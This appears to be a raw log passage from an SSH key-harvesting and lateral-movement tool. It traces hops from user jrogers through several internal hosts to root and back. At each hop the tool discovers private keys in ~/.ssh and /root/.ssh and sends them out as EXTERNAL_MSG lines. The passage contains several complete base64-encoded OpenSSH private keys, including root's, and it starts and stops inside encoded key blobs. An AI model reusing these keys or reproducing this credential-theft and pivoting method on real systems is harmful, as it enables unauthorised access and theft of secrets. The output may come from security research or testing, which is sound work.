BSThBaE1xZzUzRVZSU00rK3ZpRHRTeFBMR21rSlNJalpRCks0ZHMyMmhUdFBjT3Z5bHpWb1dRTThuM2RsSmlKRVRhWmkrbU1JSi9NWUoxUXNuVEFKSjJBVFVseGJGQzVqOVlxTXNGT0YKRnA3cmYvOXZJeDJQYkhjaExxbWFFUDY0Zmx2VjhESmFaTmZ1cHVqNWxaR3RIYTk4dnRVK3JxSTQrWnVRUWlUNnI2WGluVApGZ2xYUXFQd2YzdjB6S2ZQTW5TUU53ekVKUG5QZmNCWWRsVU9ST3lEeXR2VG9Hb2hsNFRmMThJWlZpdFhHZTl6S3gvWGpSCkViNG9nb2RtNkVvb3lKbUNWUlFPSlg4NGlad0laNDc0WjhqTmxYYk5sdVZKQzNPV2VyNFJ1U0tmM1I5aTdZRWV3aFVRQUEKQU1FQXNUM2VpVmIvZk9HcGJ4VlJ4SEhGZGtMV2I3aWxmQTRGbnpSNkxFREhodGV2bVFlc3lLTkZJaUhmTEphQW1jN0ZqTwpKQUJkNUhUemFyWkpnUzB0TVNNY3M3bE14NGx6Q25oTVNiYnJBSDhSU0ZYVU8wK0hnUmsvMHJsV2ROMnN3OWpzL0NkN3RLClorTERLMTZKNE9DK1NDUUZpRWtTa2N2c1JabGNvWmFIcjdzNytzSWxidVpSNlZuL2MrNDloN3dmakhtRWZaMkxJV1gxYTQKL01ISlY2K3h2cnR1S1NhRld3cWJBdzBpSmZmZFR1NjFQTjI0aHhEYWdsM0JHR1Q3Ky9BQUFBd1FEdnAxUXBKTXVLSUUrRwpxMzRkRFhQQXRiYWNWQkFxTGJVSzRjTkx5cDV1ZGVGRm5hczdndWpzYkU0Zk5McXBEWExvNjQ1a2dwR3NuRG1IRGxaeGI3CmVwTlBZNEJZNmI0ZU05VGZxUTliNy9uUnJiWDk5Vm1YajJLQlBMMjluMFZ2SmhHWXowUnRJMklpS001T3h1WFFOVWFvcGcKRzNEVWZDOGVHSUhReWxOSGs0bC80Y0h2UUttbHY1aU1iREIrRVVhZUVUczd6ZnNONEc5ZTZFZnJOSlphait6TC92K0JJOApiNkJEdElZUm03cnYrMHpVOEJWZUdkQmd5MWZpQktxeWNBQUFEQkFPci96QUVTYlFEUXd5TGcrWTRnakRaaUVlejNVWE5kClpkNlZQa0NhUStJb2d1b0J5a0hIU2h1MXFuQ3diZFVkM3RsYWRkQ0xHN2VMYTYya2VIbHpBQ3A0TDlIVUlBS3ptSWVEa2EKT2lNTDdUV2pYMXpiaTNiMWJPR0xxWnM3eHNnWjd4bnNtQXBxTjhjeGtiaXU2S3hxbFc4U3FqcHBIS3VCZDh1ZXdhdzVDcAplUVltMWVsVlZKZTBMZEl3Y1VRSEJVWU1DSHdrY2NSSTQxRnFsbElNZ1BqNzYvWjYzelVWZ1VBL0pwRmp4S3pIdjV5Rzk1CndSZzFPWmlpZWoxV3JSSlFBQUFCSnFjbTluWlhKelFHbHVjM1JoYm1ObExUVUJBZ01FQlFZSAotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K\n[1704020280] jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27: EXTERNAL_MSG: INFO: Beginning with 12 dests and 1 keys\n[1704020281]  jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29\n[1704020281]  jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)\n[1704020281]  jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29: Discovered usable private key [3072 MD5:a5:d8:9d:c3:32:08:3f:72:b8:57:05:f8:f7:69:63:46 jrogers@instance-7 (RSA)] in [/home/jrogers/.ssh/id_rsa]\n[1704020281]  jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29: EXTERNAL_MSG: KEY[/home/jrogers/.ssh/id_rsa]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUF2ZUxNOFdvZkYzZXVaSVZiM3dNMEVTQktQaFNQYkRqNkZEUGdEc2tSUHNZc1g2SVg2b1dpCjc5dUtKL3B0ek1TZjBjRkFyaWxLK01WbjVLOE9ndENhK2UyWlkxUEwxZUQ2VzluRzhQcThYTUVybGtUekVNTjUwRUx3T1IKdmRMSW10SVpOelZKQTVLTjN6azNKY05xVEo2MHk2dnRReEV3VjcxVGVNTUdDTTAwaHBUYXZnR0ZmTnRDVjBRcWM3aWtwdApqd1ZFTWJJdGJiM2szZXpUakRVUEc4Ym5qbDd5cC9VNG1CaWFxTDdBUENjOVdWV0hTYUpEcHE3VXpJdTNwRWVWMFcrYlhVCnp3eFJ0bXRCNStxbnRUcjdOajlUaERZaTh0bVdqdnFISWY4QnNaMkpnLzNrQWRuT1JFSDFxRVZnejQ0RFNHWWxsSDdGK3kKbEtVa3VlbXFTdkFRQ0pET051d1JHaTFDb0lPRGtiR0pCSFhRbW12MXpYQkRtZmdFQ2kyOHFjQkU5UFRXeXN2L3lLUWJLeApycmZzVUQ2cUIrR3c5RUU3NW5udXdCMENEUzRuZld1ZEVTc2prVXZjcmZnd3BEN3lYOFhIQ0JKUmozK0NGbm5yYy9qN0c0CkZtR0lTVUt4ZmR3dlBMbmFKWUtVdnArYzhwTkcwK3l4VVVMcm1VT2ZBQUFGaUlHUVNVV0JrRWxGQUFBQUIzTnphQzF5YzIKRUFBQUdCQUwzaXpQRnFIeGQzcm1TRlc5OEROQkVnU2o0VWoydzQraFF6NEE3SkVUN0dMRitpRitxRm91L2JpaWY2YmN6RQpuOUhCUUs0cFN2akZaK1N2RG9MUW12bnRtV05UeTlYZytsdlp4dkQ2dkZ6Qks1WkU4eEREZWRCQzhEa2IzU3lKclNHVGMxClNRT1NqZDg1TnlYRGFreWV0TXVyN1VNUk1GZTlVM2pEQmdqTk5JYVUycjRCaFh6YlFsZEVLbk80cEtiWThGUkRHeUxXMjkKNU4zczA0dzFEeHZHNTQ1ZThxZjFPSmdZbXFpK3dEd25QVmxWaDBtaVE2YXUxTXlMdDZSSGxkRnZtMTFNOE1VYlpyUWVmcQpwN1U2K3pZL1U0UTJJdkxabG83Nmh5SC9BYkdkaVlQOTVBSFp6a1JCOWFoRllNK09BMGhtSlpSK3hmc3BTbEpMbnBxa3J3CkVBaVF6amJzRVJvdFFxQ0RnNUd4aVFSMTBKcHI5YzF3UTVuNEJBb3R2S25BUlBUMDFzckwvOGlrR3lzYTYzN0ZBK3FnZmgKc1BSQk8rWjU3c0FkQWcwdUozMXJuUkVySTVGTDNLMzRNS1ErOGwvRnh3Z1NVWTkvZ2haNTYzUDQreHVCWmhpRWxDc1gzYwpMenk1MmlXQ2xMNmZuUEtUUnRQc3NWRkM2NWxEbndBQUFBTUJBQUVBQUFHQWVyUksxMTVLUlRIem9jV0R2ck1sUEVQdmRmCnAzUytudHdJeGRKM0RMRWhPaHJSTGovWXJwNWJHcXIzYm02VUhPUFE5eXFwaklkOFdwQTJBVU1uaDNEVFo2dm5MeDczMzQKaXM1Si9vTW9vWSs2aU5wNWI4WEJ1OURseHlHNFpRVjZ1WTI5STFJbmZiOGZuWkp6QUdTd2pyc0Ftandva2pBaSszOXZ1Zgp0S1JXWXZsaCtSS21uaTVaeW1ha1FDOTdSczQ5VDFZbC9QZDNFVXFreFZ6KzZobXNPSDhycHNlQmpBdjVoMnFNRExISlFHCjB1bXdDT2N3YkUvaDkyUDZBZEMzWkthQ2ZJV3piaHFHM2ZpY3dpMU5DYm1ZR2tER0plenNkRFZDUmwxajNxQkV5UnJHdE8KbWpRRytUb3p2Vi9GK1hxNnUzVkltQTFLaEYreHZBMk1WSGowQ3RITFdTQTBNN2RrbGYrdEUvUDZRWEl2OG5UQktHUzErQQpONlcwS1B6RWhaQk9SVlYwb0dLOU15NkVSbGxENGNqenZoTVhDRDg1blY4NEY0ZGMvb251RGFKNGVsb05ONkZ1aWRsUlhLClR4dzhXTVVYRjE3MGVpRlJ3bi9qVnY3bjNsYVptUUlQSnVBYXliMUF0ZkdjZzczT3VJd2IwbXBUeld5blcwSzBEaEFBQUEKd1FDaHcwZXMvRkdrUndsbEFYTmlPd201eHNnQWhLQUFkcHRYU3VLWWRvQlNQYklleVBGNnQ3VlVzclI0MmlmMHF0NDdmTApzMVVFeU1qRnNQcEVRMEFTbHlPUEk0U1h3NHlWaUhaTVluZ2pWOExIZ3FkOXY3a2o4cEJlNXMvNCtiZnpCUVpWbDJHQkNvCk5zdVI0cVZlMGZDbGlQd3pjMDcwOERGdnJoa2dNQXpPSWYwOWptdzkxd2dESmxuUWN1REVtZGdVSjBZY3NWMXZ2emp4NDcKbThWcFlhQzN3clBlc3FqMWdjK2RjdWJKSjlqN01ycmxnZlZsclliMTFTTi9weFAxTUFBQURCQU9CekJnWmhva0kyRzRGcwpGUXhjaVFOZUlERkFkZTJEMDdTTzRidG5vVEJSRmhKZ2VNVUFyQ2RkZGQ0NzFpZ0FSMWtCdU8rb3Nid2lXeEZtbCtPMEF3CmN5TlNtaWZGaGlMWG1VVmpnNytPdHRlSmFlaVE4OWtQT0FYQlErSzUyWXB0TERuM05IYmN6NHQ4SjRiUG4zRVkzeUZFcnQKYUVxb29HWExyNVBxRkNqQU0zemIwcVdqZmNTT3JFTjRKK0Z3cCt6blZXZU90MHoyMzJ4T2dmTDhKNUk1anZqSTlFUEU0Vgp6UDdNbUNTRklaWDNwMm9ZWTgxeEkwRyt2cWpwUXNHUUFBQU1FQTJKUDgvWmxmK0ZYbldKQ3FiUWtlbXlBa3UycE5UT1pWCnF2U3ZaZ3lTdUtmRW9pZ29zRlRCbzBITURKVEEzb3pSOVF5blJHR1BXRHprQXRwZit3N3RrQ3ZrdWtob2VOZ3FjSldBSGwKVE51dUlEQTlZaEVSYVFHTTRSVlhQQUZWWlhzOStTVzgxS2ZYWGQxQktQcnpDNXVqS1JrbFhheUsrbWE1VWl0TVpZMUhFKwpFSzBKbjM4enZiQ1BqbUYrNkE2Zm1GZkdLby9NdDVjYXFFc3U2NWVjQ05qTFhPRTlOdEJ0cm9yWGo1S0RoRWFQb1VkZ3JkCmNoSDI1L1gyVGZWMlIzQUFBQUVtcHliMmRsY25OQWFXNXpkR0Z1WTJVdE53PT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==\n[1704020282]  jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29: Discovered usable private key [3072 MD5:88:56:95:eb:90:b5:8a:1c:00:65:3f:da:75:9c:1d:71 root@instance-7 (RSA)] in [/root/.ssh/id_rsa]\n[1704020282]  jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29: EXTERNAL_MSG: KEY[/root/.ssh/id_rsa]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUF2bUlXTjZjc3c4RzhDQXFHcmhiUmhJbEF1YzRSQUQrbFRRUUR5aWVPazB4eUY3c3pNR1c4ClFpU3RTU1BqaW1wKzhub1ZmL3RuUG4wTWp5MEJtSCtyU3kyYThKeDZCSzE0cG0vT2MxbUtWNEFwRmpvZ1BFNDBXbmNtL3EKTjU3UzM1eUNxQ3o3Vkw0Y0xOMHNqN3N3ME9KR3p5NlNxVW9zckY5QnVxL0t4bjRCeUlzRGErRm0vSVdpRDZiczczTGhMRAp4UFpXNDd0N2xmYWczNTNCTWNBTXJ4U0pkM2lxS3UwamNYa29vdUwzUzNUSlNJUHBneDBnelBaSkNhSDVBOTd0Z1dIbERDClp6ZVlFNFdGVU9KQ0VzcXlwVnRRSDZkN2ZWcGgxaHVCd1Z5VzRTVXpxUStSNjVHWWRFYmFVdks5V1dueHlUc0ZMcERYMGEKcjNmbTUzUkpqRm5pM1h3eW8zUS85ODhxT2Z3cUVLODJDKzE0a0Z2UGdYUE5CQTJZQzhJdndVR1RSUFlrRkhVdnlvQmdpbApISzJRa1ZCUFA4SnVaZ01kNWFXcmFWV2lWdHBmempvMWhMa3NCT0lwemx5cXJmQVBnZVJINmRSeExEdEtLTU5JZVFTWnRECi9XbDFueDg0bFJtQnBuS29RVEtidnQ0dnNpMGpFQ0NrV1BzcTFkejNBQUFGaUNoOTViTW9mZVd6QUFBQUIzTnphQzF5YzIKRUFBQUdCQUw1aUZqZW5MTVBCdkFnS2hxNFcwWVNKUUxuT0VRQS9wVTBFQThvbmpwTk1jaGU3TXpCbHZFSWtyVWtqNDRwcQpmdko2RlgvN1p6NTlESTh0QVpoL3Ewc3RtdkNjZWdTdGVLWnZ6bk5aaWxlQUtSWTZJRHhPTkZwM0p2NmplZTB0K2NncWdzCisxUytIQ3pkTEkrN01ORGlSczh1a3FsS0xLeGZRYnF2eXNaK0FjaUxBMnZoWnZ5Rm9nK203Tzl5NFN3OFQyVnVPN2U1WDIKb04rZHdUSEFESzhVaVhkNHFpcnRJM0Y1S0tMaTkwdDB5VWlENllNZElNejJTUW1oK1FQZTdZRmg1UXdtYzNtQk9GaFZEaQpRaExLc3FWYlVCK25lMzFhWWRZYmdjRmNsdUVsTTZrUGtldVJtSFJHMmxMeXZWbHA4Y2s3QlM2UTE5R3E5MzV1ZDBTWXhaCjR0MThNcU4wUC9mUEtqbjhLaEN2Tmd2dGVKQmJ6NEZ6elFRTm1BdkNMOEZCazBUMkpCUjFMOHFBWUlwUnl0a0pGUVR6L0MKYm1ZREhlV2xxMmxWb2xiYVg4NDZOWVM1TEFUaUtjNWNxcTN3RDRIa1IrblVjU3c3U2lqRFNIa0VtYlEvMXBkWjhmT0pVWgpnYVp5cUVFeW03N2VMN0l0SXhBZ3BGajdLdFhjOXdBQUFBTUJBQUVBQUFHQkFLak1tUHhSS2h5SzJtZWF4WnozT0Y4MXZvCkMvbDAxTUlRanZCVmtveDM0TWFxQmw1MVlDN2U4TFMrVXNmK1BLMXJHdzB2MDliMlgxUTd4eVlCYlJJNVF0WkZIdnV6UUkKaG8relZDM3I5di9yN3dINUdYbStzU2FBdkw5TFBLQ3hnZVVhNUE2N3BRTVBVS1NTZExCbFkrT2lBYUlBa2ZiZ3FMRHVFeQpXaXl4cm0wYjdEV3JqVDlhVUwxbCtHKzV3TElTNnlaNG5WUWhkTnE0ZDQvTUZha1NSdXBnK2FtZTRqZ2Focmp6OFUwOFJBClVQTU5tbTRZMW10RDlyQW12MzNTR2VUbTV1Skozdm9Ya3plVHVqUW9NYkh3SHg1TVpqQkJwcW9VR3ZLL3RUUjdjT3VYMzIKd1VwdXQzTFNvZWNMV1ZhN21pTkFHY1JUcnB2aEhYTXhPMExXVHdYa0h2Q0VTemVlSUlTOVBaaDQ1bUY2Wms5ZThhZzVlNQpHSXgzZFljSFZEaW81d1VSam12M21RWDRrVHBoOGQ5WVhzZS9sdHhsZlFWVDY5bW9MYmszUDZJR01OQU9aMWhRb2FmVlN1CllNdGE4V1JQY2d1RkFlT3dtUGFTOXc0VGVLSXpjTG12VHJDZDY2dU5rTXRNWjZORWloOXBTZ2lEMUJDU3Z5T0R6MTZRQUEKQU1FQXZLcnVUY0FlenFPUjNZMXhHZTBiR29xRFU4QUhUTjBtYWVMa1RSaHZqalc0MElndXkvQ2hleTRSNnd0a1FQN3pSSQoyQzAyemJMTkh3cU5lOGJDRjdFNWVyRFJuZStsaHB1bm9CQUxnZ3Yya0ZvNnhhanVpcW1VVlJTaHVjSlR1bnhmK251b21jCnVsQ2VNL0dOZUlLbkFwdEdFL3MvaU5RN3ZUdnA3NW9BemNRWVo3NVJETWt5OUlxZ1NQb1pLd3dsbFpHYkd0K21TaS9UUi8KZHVuZkVrcGs3TVpRU3h2c0RTSjFJbnpZOHFxMUtQV1BtbW03czNZbS9Id1NxUUxicUdBQUFBd1FEcFdCZUJ2WTZtYVovOQpycXZ3Y1RNakxqSnJBZEZWR2ZQWmtBQy9BVDJwOTBBNEZJZTNCcDhGU1dWTFU2cG1aNzdrSjVJSUZCdGxXZjJnNmNFcmExCjYrYVREaUt5N1NsZWxNNTdaQVFyS1BPUEtDcHdTcXZGcTVaNjEwcjhzWkg5STE1c29BYkhQM1hLb0pPS09WUTFtVDZ5bXEKOTQzZUg2QU9KZGxsNlI2Qldwc2o3aFUvbURvMW03YmZWdkd4R2xIU1ZmdTArZUtEUTBsczU5YW5BQnEzbWFBbTNYQmUrTwowMy9xMTQ0UUxkR2grbFlwV2hsOHRrbG51Vll1QjhhVjBBQUFEQkFORGVMSzRmaG03d3JiUUtoNTJGMy9YSzR2eU5HSVRBCjdmQVZ3R3dscVF3clBFQm9mLzIycHlnaUFlWGFOK2ZNRG5ZdU56TTRoOGNZakgyK2grRkVGL3JKV2c1M2RCVU5QUnFLK28KNEJINGlnaTNZQ3pXSnlWYTVJemtPakxCWURLbVBsbm5MK09GU0NtaVYxUXM5MlRPMG0vRk4xcXVra0cvSVMwdEM4MlV0SwpqbkdYR2NCNjBWd002Um15ZlA3ZldSWUlSWFRGNTYrT0l2VFg5SUt0Zlk5ME52MnJpTU1GR0I5VzA3aUhyVU5iYzdHNmNwCndFalFUcnJVQlVyUVcyWXdBQUFBOXliMjkwUUdsdWMzUmhibU5sTFRjQkFnPT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==\n[1704020282]  jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29: EXTERNAL_MSG: INFO: Beginning with 6 dests and 2 keys\n[1704020282]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25\n[1704020282]   jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)\n[1704020283]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25: Discovered usable private key [3072 MD5:b2:45:a5:03:54:c7:71:29:c1:0d:f5:c5:e8:27:63:5f jrogers@instance-3 (RSA)] in [/home/jrogers/.ssh/id_rsa]\n[1704020283]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25: EXTERNAL_MSG: KEY[/home/jrogers/.ssh/id_rsa]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUFua1JURStqRURCZU5sM25WRVIyTk9udUU4ZUIzSHdxeDhCMWphamdDZmk3NERIZlYvc3hZCnlkNjBybTRYbHFzWk8weFM3YW5vVTM5RmFhZ1llL2R6RG1ZWDY3Y0V0V0hsVUJQVGh0OEhYUjFUMlBYaGZLZTBsUHA3Sk8KS0ZFTjFqMmRYaEhsd0g2dlhMc1RwS3lUdzBYR2FoRmhoNHl1VWlkTi9RRlQ2aDgwRlArZ1c0N1J4U1hGTUlQRE9McWJrSwpVNU0zRER4ZUlaaDgzT0UzcDlRSHBzS2VIamZaNWYzaDBtbFFLY05vOGE3eHI1OVRCcGFhMkwxc05KbXZNTzNVb3QzeG9VCnRnU0dLNldValNOQjcxeldNN1lyUFIwd3JzSHBObGpFUkdIV05DR1lTU0NtVUdNclhOUjk2N1VKYjZ3Yk9KUitEUk1vUzcKUEY2VHdXek5VY2lIcXN3a1FMZUFGM1FObWFKWXBHUXFLbkVoN0ZMRkExdklEWjVSeWhoTnZGSkVoMUt2bWxQMzVJS3l6ZgppTkdXRjZHTCsrYVVtUlJpY2xuU3AyMTcxaTB5djJicm92L0tOMmlXYXEvQStOZjBGaFlYZDJ4RzlCK1RFbHFOT0xyRnRtClc3ZVkySFFtWlBPb3VRQlJ4Zms0Nm96QzczMTJJOHhjQUFFdnpFMnZBQUFGaUd3cTRxTnNLdUtqQUFBQUIzTnphQzF5YzIKRUFBQUdCQUo1RVV4UG94QXdYalpkNTFSRWRqVHA3aFBIZ2R4OEtzZkFkWTJvNEFuNHUrQXgzMWY3TVdNbmV0SzV1RjVhcgpHVHRNVXUycDZGTi9SV21vR0h2M2N3NW1GK3UzQkxWaDVWQVQwNGJmQjEwZFU5ajE0WHludEpUNmV5VGloUkRkWTluVjRSCjVjQityMXk3RTZTc2s4TkZ4bW9SWVllTXJsSW5UZjBCVStvZk5CVC9vRnVPMGNVbHhUQ0R3emk2bTVDbE9UTnd3OFhpR1kKZk56aE42ZlVCNmJDbmg0MzJlWDk0ZEpwVUNuRGFQR3U4YStmVXdhV210aTliRFNacnpEdDFLTGQ4YUZMWUVoaXVsbEkwagpRZTljMWpPMkt6MGRNSzdCNlRaWXhFUmgxalFobUVrZ3BsQmpLMXpVZmV1MUNXK3NHemlVZmcwVEtFdXp4ZWs4RnN6VkhJCmg2ck1KRUMzZ0JkMERabWlXS1JrS2lweElleFN4UU5ieUEyZVVjb1lUYnhTUklkU3I1cFQ5K1NDc3MzNGpSbGhlaGkvdm0KbEprVVluSlowcWR0ZTlZdE1yOW02NkwveWpkb2xtcXZ3UGpYOUJZV0YzZHNSdlFma3hKYWpUaTZ4YlpsdTNtTmgwSm1UegpxTGtBVWNYNU9PcU13dTk5ZGlQTVhBQUJMOHhOcndBQUFBTUJBQUVBQUFHQWRTRHZzdzVTK1BmOWJCdFlXb0JhWXV2REtoCmNMVWNmaWhHZmJpV0xHUllpUlB2ajVRTWNPOXVlQkpJNkptcElwN0Q3Q0tPM1Q2T2VLQVhYTUdRSzYvZThFeVFmN3poa1QKVXI0NWo5bERZK0F1aTZUOUtmb2JwUjN6UVFyN204MmM5anhaak5SamI3cFU4MmJHcmtPR0pOUTNaMWpaSEorVGJwZXRNZQp2V2cyYlV2NTY0aTVLb1NYZVI0cXZyTXNLbEo5RU5ybHFHOTZvWXpvZEhYMGVHR2g1eVVyN1czbVdVV05wajMyU2xLQ2htCjZhaXFFM2dtUlQxNjlUcS84eUF2VWdUcDRGUjFZU09WY1V1RHVHSjF5aWc4cUFmUVdIMnN6THhRa1R4dkhXTjlOTU9zczkKKzloSmJjZjRDN0p3VXRaQTUwQVBXdnpWZnVyakh0VEVBQ1ZNOE83MDZ3NFlkY2pSNzVhbk5tamlINXRhSWhKU0w5YStBYwoxOXBJUmJEUzRCRldHS2wwSk1LU3NwdjF3eXVmZDZ4cGhlZE12cnNieE1OeFVBdU9vTzBXRXVXRDFDT29QbEx0M09IUGVFClpwWTRnUFpwQkFwakR4QmZ6cS9QdWtGOC84QWt5eXdSY1pEUU4yVGtWdjdkWmlKS2s2Y1EwWjA5YVoxSEpONGlVUkFBQUEKd0hOdEx5eUU0aEJUZk5ZS2EyNldyay92cWQ1UlZiMktvZm9wT2lrV1R5Y25vOUp0L1llN0FRWGc4Yks3UzBNeVpCbzdkSApVMnRDL1B5Tzl5NjQyMEZoYVg0NURLZnlYckRBNk44UU1WVmtHd25zaWFDUERKUkhVUUwvVTRjZ1pUOVB2SUI5enVNMUM4CkVObzhYMmhBalVYa1ljWmdTYUM4Y2F1TjhWSk4wMFVBa0xxbHE3TTdKYmhHS2phUm54ejN2R0Z2S2RnZ3hPdHpqNTVpeWcKRGJmOGF1TGI4Q2w4TWZVNGdWRkxjZ2lOaER0UXFrRWxnd29GeXVwKzhJckdLU1hBQUFBTUVBenVSUlY3RURiS0VaWGhsQQpGQ3g4Q1oxWjlWS1pBU3BVS3VrUzNVb3Y0enhrTENaWjR4RzUvZUtjeVAvdUkzMVgrclJsMFRncUlkMjZzOG1KSHFTTE9WCkNiSzBFcG9XY0lUamttK0szZHVwWXJvVUNKeExWeHdMdVR6U09DbUtoWDNTV0JQK2lMR1hsV0hzekdyeG9wSWQ5SkcrbWMKWm9TWVAzYVJXTDlWUG9uSFc2WjhoL0VjSkxmVEVxM21OeUZTdU5CakdudXl6dVpyeHJqUER1ZGhvckEyRExFNVpMZHJ1VApuaVBjREtFWFBlL25lcnh1bUtlWTFxSmdkVm5RVmJBQUFBd1FERDFWV1FUcHpNd3VuamdNa01zUXdIY3ZUeHcyOTZnM2hOClRhSFF6ZkJNcDExODREWkc2RXJDSm5aS3JIU0dwYThFSGtURmlXOEc1bGJzNG5iQWtLMG5KUmNVaStyaHU2cVhQNml3Qm0KandQYjVsNldDdmVSVW5OckRBcmZ4SGNQM3hUelVBYW1HUitQYURBejY2V3U0UlR3ZUZYZW9vVHV0ZDg3ZDBPU1RPRkZXWQpWUnFCb0tKcW5Weml0Qm5VeVdhS3IyMjgweXVUdTUzU1lHOEtIeXFab25oZFFFSURCS2lwUmgvYzNRSGwwOXU2SWlueWVyCmZXNENGT2tiazV4VDBBQUFBU2FuSnZaMlZ5YzBCcGJuTjBZVzVqWlMwekFRPT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==\n[1704020283]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25: Discovered unusable private key in [/home/jrogers/.ssh/protected]\n[1704020283]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25: EXTERNAL_MSG: KEY[/home/jrogers/.ssh/protected]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQ21GbGN6STFOaTFqZEhJQUFBQUdZbU55ZVhCMEFBQUFHQUFBQUJEdUlHSGd4RAp5MEh0WW9QUmUwK1VBUEFBQUFFQUFBQUFFQUFBR1hBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FEQXIvWWZCRWpnCmE0QnMycnJWWUhSVk1ramxEcHU0T2hDMEJBcWVRYlZYd0l0czNRb09vSkZmMGErSFNDRG5DR0FUblY1SHpkYUR0eENRbVIKMmdzdlczY29CT0tZbThBMTJkLzFxSGZFUG0rNkxoaTFjek44clp0QlV5WDRCLzRqQmFsMWJzLzczSnFRQmZYMmZEbHBJRQpJUmJGbUtqWnNqN1FIOEppRnBlYzIrbmJ2bG1SSWVPeHlPd3ZvUlJzeGcvUU1tdGR0VUp3ZHJNL2pQVVBVQlRBdllrWTFiCk9yVXJYaHdZbDJJVVFmUjY4bTU0VnU5MWpPUHY0VStjWkFJR1FEaWNQYjlodUFEeUxxR2dnQVp6eVJNak1pUkp5RFlnM3AKT3ZyNThBa3p0SHdwSUJiTEhhSzVrZ04xN0RwbFZsc2t0NEpXVFFLanZqWVJJWmp1VzUyTFJJT0JqMjAxZk1LVmhENzdwYgpoekZNbDZkdHY0cE5qU2gxYUhoMGtRRy9ldTcxeUxpLzduWTZuU2prNFd0MWNONHRKQWJ0ZnRCdmJTai80Y2RabFl5cis4CitDWW1TQTJhSlVITTFxRTlvRTV1VGhZa1RnMW91ais0NWRYcUhsU2gvaWFwT0h3Rk45WWY1RnY2ZFpSc0p1UzJmcEo5UjIKVlNlQkJVdC9LSm1SRUFBQVdROGlEUGlWbWRtUW9oSjVELzF4VWlwOG1qeUt5ZXc3eEdMODdqdG9yaEgxcGJCQlc3OHBJLwpxVWNrMFJjNmN4MmZuM0dGSmFtcVJKWTcza3h6a29jVTNVRFV4MWIvc0NJTUZLcGpVSTA5WVFueWRZdjZtN21nWk5nV0FFCktSN283eW5kTVErbnZmNk1WQWtKQ2Rha0daOC8rSTI0ck9xaHUzdHpOQzFZVG5xSTZteW9zRXJ2QUw4WEZQVmpEZld3Uy8Kd2NQeXp0b0lsV1lXWUc0cUh6NXBmM3ZobnI3bE9SWHR5WW93Z2pvc09sWFYvb0xaWWUwQXJzRHJvOW1OaFZGRlQwSTR5SQpDRTE5VmtKekJhZXpkMU9RRTdIcHQwcjhPdkZQWkJDalBsMTFKbzVQcHpmbjlnenZTMTd5M0RURWZvcXpFT25yaHVYWEF4CjJURjdWUGptSGdWQldIaDgyb3Z0c1o3YjZYZTVEV0ozSXBHSEtTNFUxSlc5dTZiRVFRRHEwbmJyVU9mMTIyTWFYYmt4TlkKL3JDZGlkTzBESElWejZvOWgyNkVQMlJrTlpwTlI4MFROT2RjYWFYV25XdytyWkl3eTZMelByeEdkbVpWUVZibW9oVXh0MQp3MEJjWW